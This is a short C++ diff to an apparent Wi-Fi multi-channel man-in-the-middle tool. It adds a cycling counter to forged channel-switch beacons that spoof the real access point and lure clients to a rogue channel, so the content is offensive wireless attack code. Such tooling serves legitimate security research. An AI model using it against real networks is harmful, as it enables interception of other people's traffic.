@@ -178,6 +178,7 @@ void McMitm::run(RunStatus &rs, const int timeout_sec) {
 	last_rogue_beacon = steady_clock::now();
 	auto next_beacon = steady_clock::now();
 	const auto start_time = steady_clock::now();
+	int csa_count = 3; // cycles 3→2→1→0→3… one frame per beacon interval
 
 	while(!stop_mitm) {
 		if(timeout_sec > 0 && steady_clock::now() > start_time + seconds(timeout_sec)) {
@@ -216,7 +217,13 @@ void McMitm::run(RunStatus &rs, const int timeout_sec) {
 			const bool client_associated = client_state.get_state() >= ClientState::GotMitm;
 			if(!client_associated) {
 				const bool custom = hooks && hooks->send_periodic_beacon(*this);
-				if(!custom) send_csa_beacon(1); //TODO add 3->0 counter
+				if(!custom) {
+					RadioTap csa_rt = CSA_attack::get_CSA_beacon(
+							ap.get(SK::mac), netconfig.real_channel, netconfig.rogue_channel,
+							csa_count, beacon.get());
+					send_to_real(csa_rt);
+					if(--csa_count < 0) csa_count = 3;
+				}
 			}
 			next_beacon += milliseconds(beacon_interval_ms);
 		}
